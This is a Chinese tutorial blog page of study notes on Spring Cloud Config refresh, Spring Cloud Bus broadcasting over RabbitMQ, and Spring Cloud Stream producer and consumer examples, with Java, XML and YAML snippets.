<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;config&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String configInfo;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/configInfo&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getConfigInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> configInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131224044869.png" alt="image-20210131224044869"></p>
<p><img src="https://csn.damyoung.cn/image-20210131224119878.png" alt="image-20210131224119878"></p>
<p><img src="https://csn.damyoung.cn/image-20210131224245525.png" alt="image-20210131224245525"></p>
<p><strong>存在问题：</strong></p>
<p>分布式配置的动态刷新问题</p>
<p><img src="https://csn.damyoung.cn/image-20210131224742641.png" alt="image-20210131224742641"></p>
<h3 id="动态刷新"><a href="#动态刷新" class="headerlink" title="动态刷新"></a>动态刷新</h3><p><img src="https://csn.damyoung.cn/image-20210131224943520.png" alt="image-20210131224943520"></p>
<p>3355客户端</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;config&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String configInfo;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/configInfo&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getConfigInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> configInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210131225605591.png" alt="image-20210131225605591"></p>
<p>需要运维人员发送post请求刷新3355</p>
<p><img src="https://csn.damyoung.cn/image-20210131225714671.png" alt="image-20210131225714671"></p>
<p><img src="https://csn.damyoung.cn/image-20210131225728695.png" alt="image-20210131225728695"></p>
<p>成功实现了客户端3355刷新到最新配置内容-避免了服务重启</p>
<p><img src="https://csn.damyoung.cn/image-20210131225918816.png" alt="image-20210131225918816"></p>
<h1 id="消息总线"><a href="#消息总线" class="headerlink" title="消息总线"></a>消息总线</h1><p>分布式自动刷新配置功能</p>
<h2 id="Bus"><a href="#Bus" class="headerlink" title="Bus"></a>Bus</h2><p>SpringCloud Bus配合SpringCloud Config使用可以实现配置的动态刷新</p>
<p>Bus支持俩种消息代理：RabbitMQ和kafka</p>
<p><img src="https://csn.damyoung.cn/image-20210131230319685.png" alt="image-20210131230319685"></p>
<p>SpringCloud Bus能管理和传播分布式系统间的消息，就像一个分布式执行器，可用于广播状态更改、事件推送等，也可以作微服务间的通信通道</p>
<p><img src="https://csn.damyoung.cn/image-20210131234652872.png" alt="image-20210131234652872"></p>
<h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><p>安装见 linux-rabbitmq安装</p>
<p>访问<a href="http://42.192.130.130:15672/">http://42.192.130.130:15672</a></p>
<p><img src="https://csn.damyoung.cn/image-20210201003956704.png" alt="image-20210201003956704"></p>
<h3 id="Bus动态刷新全局广播"><a href="#Bus动态刷新全局广播" class="headerlink" title="Bus动态刷新全局广播"></a>Bus动态刷新全局广播</h3><p><img src="https://csn.damyoung.cn/image-20210131235048007.png" alt="image-20210131235048007"></p>
<p><img src="https://csn.damyoung.cn/image-20210131235613392.png" alt="image-20210131235613392"></p>
<p><img src="https://csn.damyoung.cn/image-20210131235730290.png" alt="image-20210131235730290"></p>
<p><img src="https://csn.damyoung.cn/image-20210131235754061.png" alt="image-20210131235754061"></p>
<p>选择第二种设计思想，第一种不可行原因</p>
<p><img src="https://csn.damyoung.cn/image-20210131235923580.png" alt="image-20210131235923580"></p>
<p>3344</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        添加消息总线RabbitMq支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span>   </span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rabbitmq相关配置,暴露bus刷新配置的端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;bus-refresh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>3355/3366</p>
<p>pom.xml同上</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"> 	<span class="attr">rabbitmq:</span></span><br><span class="line">    	<span class="attr">host:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span></span><br><span class="line">    	<span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">   		<span class="attr">xusername:</span> <span class="string">guest</span></span><br><span class="line">    	<span class="attr">password:</span> <span class="string">guest</span></span><br></pre></td></tr></table></figure>

<p>测试</p>
<p><img src="https://csn.damyoung.cn/image-20210201090843728.png" alt="image-20210201090843728"></p>
<p><img src="https://csn.damyoung.cn/image-20210201090905242.png" alt="image-20210201090905242"></p>
<p><img src="https://csn.damyoung.cn/image-20210201090919944.png" alt="image-20210201090919944"></p>
<p><img src="https://csn.damyoung.cn/image-20210201090934601.png" alt="image-20210201090934601"></p>
<p>修改version=4</p>
<p><img src="https://csn.damyoung.cn/image-20210201091013112.png" alt="image-20210201091013112"></p>
<p><img src="https://csn.damyoung.cn/image-20210201091026330.png" alt="image-20210201091026330"></p>
<p>发送post请求，实现一次发送，处处生效</p>
<p><img src="https://csn.damyoung.cn/image-20210201091300917.png" alt="image-20210201091300917"></p>
<p><img src="https://csn.damyoung.cn/image-20210201091327317.png" alt="image-20210201091327317"></p>
<p>达到一次修改，广播通知，处处生效</p>
<p><img src="C:%5CUsers%5Cadmin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210201092035061.png" alt="image-20210201092035061"></p>
<h3 id="Bus动态刷新顶点通知"><a href="#Bus动态刷新顶点通知" class="headerlink" title="Bus动态刷新顶点通知"></a>Bus动态刷新顶点通知</h3><p>不想全部通知，只想定点通知，只通知3355</p>
<p>指定具体某个实例生效而不是全部，<a href="http://localhost:3344/actuator/bus-refresh/applicationName:port">http://localhost:3344/actuator/bus-refresh/applicationName:port</a></p>
<p>/bus-refresh请求不再发送到具体的服务实例上，而是发送给config server并通过destination参数类指定需要更新配置的服务或实例</p>
<p>案例：只通知3355,不通知3366</p>
<p><img src="https://csn.damyoung.cn/image-20210201092008497.png" alt="image-20210201092008497"></p>
<p><img src="https://csn.damyoung.cn/image-20210201092055910.png" alt="image-20210201092055910"></p>
<p><img src="https://csn.damyoung.cn/image-20210201092215444.png" alt="image-20210201092215444"></p>
<h1 id="消息驱动"><a href="#消息驱动" class="headerlink" title="消息驱动"></a>消息驱动</h1><p>springCloud Stream 屏蔽底层消息中间件的差异，降低切换成本，统一消息的编程模型</p>
<p>官网：<a href="https://spring.io/projects/spring-cloud-stream#overview">https://spring.io/projects/spring-cloud-stream#overview</a></p>
<p>中文：<a href="https://m.wang1314.com/doc/webapp/topic/20971999.html">https://m.wang1314.com/doc/webapp/topic/20971999.html</a></p>
<p><img src="https://csn.damyoung.cn/image-20210201101647228.png" alt="image-20210201101647228"></p>
<h2 id="设计思想"><a href="#设计思想" class="headerlink" title="设计思想"></a>设计思想</h2><h3 id="标准MQ"><a href="#标准MQ" class="headerlink" title="标准MQ"></a>标准MQ</h3><p>生产者/消费者之间靠消息媒介传递消息内容-Message</p>
<p>消息必须走特定的通道-消息通道MessageChannel</p>
<p>消息通道MessageChannel的子接口SubscribableChannel,由MessageHandler消息处理器所订阅</p>
<p><img src="https://csn.damyoung.cn/image-20210201102208490.png" alt="image-20210201102208490"></p>
<h3 id="CloudStream"><a href="#CloudStream" class="headerlink" title="CloudStream"></a>CloudStream</h3><blockquote>
<p>Stream中的消息通信方式遵循了发布-订阅模式</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210201102710222.png" alt="image-20210201102710222"></p>
<p>中间件的差异性导致我们实际项目开发给我们造成一定的困扰，如果用了俩种消息队列的其中一种，后面的业务需求，我们想往另外一种消息队列进行迁移，这时候无疑是一个灾难性的，一大堆东西都要重新推到重新做，因为它跟我们的系统耦合了，这时候springcloud Stream给我们提供一种解耦合的方式</p>
<p><img src="https://csn.damyoung.cn/image-20210201103014600.png" alt="image-20210201103014600"></p>
<p><img src="https://csn.damyoung.cn/image-20210201103129111.png" alt="image-20210201103129111"></p>
<p><img src="https://csn.damyoung.cn/image-20210201103427696.png" alt="image-20210201103427696"></p>
<p>Binder：很方便的连接中间件，屏蔽差异</p>
<p>Channel：通道，是队列Queue的一种抽象，在消息通讯系统中就是实现存储和转发的媒介，通过channel对队列进行配置</p>
<p>source和sink：简单可理解为参照对象是springcloud stream自身，从stream发布消息就是输出，接收消息就是输入</p>
<h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p><img src="https://csn.damyoung.cn/image-20210201103840324.png" alt="image-20210201103840324"></p>
<h2 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h2><ol>
<li>RabbitMq环境</li>
<li>三个子模块</li>
</ol>
<p><img src="https://csn.damyoung.cn/image-20210201103936754.png" alt="image-20210201103936754"></p>
<h3 id="消息驱动之生产者"><a href="#消息驱动之生产者" class="headerlink" title="消息驱动之生产者"></a>消息驱动之生产者</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        stream rabbitmq --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-stream-rabbit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8801</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-stream-provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">stream:</span></span><br><span class="line">      <span class="attr">binders:</span> <span class="comment"># 在此处配置要绑定的rabbitmq的服务信息；</span></span><br><span class="line">        <span class="attr">defaultRabbit:</span> <span class="comment"># 表示定义的名称，用于于binding整合</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">rabbit</span> <span class="comment"># 消息组件类型</span></span><br><span class="line">          <span class="attr">environment:</span> <span class="comment"># 设置rabbitmq的相关的环境配置</span></span><br><span class="line">            <span class="attr">spring:</span></span><br><span class="line">              <span class="attr">rabbitmq:</span></span><br><span class="line">                <span class="attr">host:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span></span><br><span class="line">                <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">                <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">                <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line">      <span class="attr">bindings:</span> <span class="comment"># 服务的整合处理</span></span><br><span class="line">        <span class="attr">output:</span> <span class="comment"># 这个名字是一个通道的名称</span></span><br><span class="line">          <span class="attr">destination:</span> <span class="string">studyExchange</span> <span class="comment"># 表示要使用的Exchange名称定义</span></span><br><span class="line">          <span class="attr">content-type:</span> <span class="string">application/json</span> <span class="comment"># 设置消息类型，本次为json，文本则设置“text/plain”</span></span><br><span class="line">            <span class="attr">binder:</span> <span class="string">defaultRabbit</span> <span class="comment"># 设置要绑定的消息服务的具体设置</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span> <span class="comment"># 客户端进行Eureka注册的配置</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">2</span> <span class="comment"># 设置心跳的时间间隔（默认是30秒）</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">5</span> <span class="comment"># 如果现在超过了5秒的间隔（默认是90秒）</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">send-8801.com</span>  <span class="comment"># 在信息列表时显示主机名称</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span>     <span class="comment"># 访问的路径变为IP地址</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamMQMain8801</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(StreamMQMain8801.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210201105616678.png" alt="image-20210201105616678"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IMessageProvider</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">String <span class="title">send</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.service.IMessageProvider;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.stream.annotation.EnableBinding;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.stream.messaging.Source;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.support.MessageBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageChannel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> dmYang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021/2/1 10:57</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//定义消息的推送管道</span></span><br><span class="line"><span class="meta">@EnableBinding(Source.class)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageProviderImpl</span> <span class="keyword">implements</span> <span class="title">IMessageProvider</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> MessageChannel output; <span class="comment">//消息发送管道</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">send</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String serial = UUID.randomUUID().toString();</span><br><span class="line">        output.send(MessageBuilder.withPayload(serial).build());</span><br><span class="line">        log.info(<span class="string">&quot;serial=====: &quot;</span>+serial);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SendMessageController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> IMessageProvider iMessageProvider;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/sendMessage&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sendMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iMessageProvider.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210201111018848.png" alt="image-20210201111018848"></p>
<p><img src="https://csn.damyoung.cn/image-20210201112236864.png" alt="image-20210201112236864"></p>
<p><img src="https://csn.damyoung.cn/image-20210201112347845.png" alt="image-20210201112347845"></p>
<p><img src="https://csn.damyoung.cn/image-20210201112249929.png" alt="image-20210201112249929"></p>
<p><img src="https://csn.damyoung.cn/image-20210201112259845.png" alt="image-20210201112259845"></p>
<h3 id="消息驱动之消费者-2"><a href="#消息驱动之消费者-2" class="headerlink" title="消息驱动之消费者(2)"></a>消息驱动之消费者(2)</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-stream-rabbit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8802</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-stream-consumer</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">stream:</span></span><br><span class="line">      <span class="attr">binders:</span> <span class="comment"># 在此处配置要绑定的rabbitmq的服务信息；</span></span><br><span class="line">        <span class="attr">defaultRabbit:</span> <span class="comment"># 表示定义的名称，用于于binding整合</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">rabbit</span> <span class="comment"># 消息组件类型</span></span><br><span class="line">          <span class="attr">environment:</span> <span class="comment"># 设置rabbitmq的相关的环境配置</span></span><br><span class="line">            <span class="attr">spring:</span></span><br><span class="line">              <span class="attr">rabbitmq:</span></span><br><span class="line">                <span class="attr">host:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span></span><br><span class="line">                <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">                <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">                <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line">      <span class="attr">bindings:</span> <span class="comment"># 服务的整合处理</span></span><br><span class="line">        <span class="attr">input:</span> <span class="comment"># 这个名字是一个通道的名称</span></span><br><span class="line">          <span class="attr">destination:</span> <span class="string">studyExchange</span> <span class="comment"># 表示要使用的Exchange名称定义</span></span><br><span class="line">          <span class="attr">content-type:</span> <span class="string">application/json</span> <span class="comment"># 设置消息类型，本次为对象json，如果是文本则设置“text/plain”</span></span><br><span class="line">          <span class="attr">binder:</span> <span class="string">defaultRabbit</span> <span class="comment"># 设置要绑定的消息服务的具体设置</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span> <span class="comment"># 客户端进行Eureka注册的配置</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">2</span> <span class="comment"># 设置心跳的时间间隔（默认是30秒）</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">5</span> <span class="comment"># 如果现在超过了5秒的间隔（默认是90秒）</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">receive-8802.com</span>  <span class="comment"># 在信息列表时显示主机名称</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span>     <span class="comment"># 访问的路径变为IP地址</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamMQMain8802</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(StreamMQMain8802.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//消费者</span></span><br><span class="line"><span class="meta">@EnableBinding(Sink.class)</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReceiveMessageListenerController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@StreamListener(Sink.INPUT)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">input</span><span class="params">(Message&lt;String&gt; message)</span></span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;消费者1号---&gt;接受到的消息: &quot;</span>+message.getPayload()+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;端口号port:  &quot;</span>+serverPort);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210201113410698.png" alt="image-20210201113410698"></p>
<p><img src="https://csn.damyoung.cn/image-20210201113322885.png" alt="image-20210201113322885"></p>
<p><img src="https://csn.damyoung.cn/image-20210201113350085.png" alt="image-20210201113350085"></p>
<h3 id="消息重复消费问题"><a href="#消息重复消费问题" class="headerlink" title="消息重复消费问题"></a>消息重复消费问题</h3><p>clone一份运行8803</p>
<p><img src="https://csn.damyoung.cn/image-20210201114103407.png" alt="image-20210201114103407"></p>
<p><img src="https://csn.damyoung.cn/image-20210201114311618.png" alt="image-20210201114311618"></p>
<p><img src="https://csn.damyoung.cn/image-20210201114440853.png" alt="image-20210201114440853"></p>
<p><img src="https://csn.damyoung.cn/image-20210201114623617.png" alt="image-20210201114623617"></p>
<p><img src="https://csn.damyoung.cn/image-20210201114635363.png" alt="image-20210201114635363"></p>
<p><strong>发送消息，存在重复消费问题，8802/8803均存在消费信息</strong></p>
<p><img src="https://csn.damyoung.cn/image-20210201114539858.png" alt="image-20210201114539858"></p>
<blockquote>
